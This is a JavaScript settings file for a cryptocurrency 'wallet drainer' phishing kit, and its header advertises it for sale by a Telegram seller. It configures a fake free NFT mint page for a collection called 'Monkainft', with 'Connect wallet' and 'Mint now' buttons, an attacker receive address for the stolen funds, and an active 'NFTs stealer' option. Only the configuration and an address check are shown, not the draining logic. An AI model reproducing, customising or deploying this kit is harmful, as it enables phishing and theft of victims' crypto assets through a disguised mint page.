// Full Wallet Drainer Made By @TecOnSellix On Telegram. Message Us For The Full Script / And Other Services.

const receiveAddress = "0xbbAf73D9433E98938C6589E76651E27EEc7143b4";

const collectionInfo = {
    name: "Monkainft.",
    socialMedia: {
        // discord: "https://discord.com",
        twitter: "https://twitter.com/monkainft",
        // instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "MINT",
}

const claimPageInfo = {
    title: "", // <br> is a line break
    shortDescription: "Price: Free",
    longDescription: "Batch mint 1. Max 1 per wallet. You will not know what you got until 100% sale, or after Thursday's announcement.",

    claimButtonText: "MINT",

    image: "ola.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0xbbAf73D9433E98938C6589E76651E27EEc7143b4" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion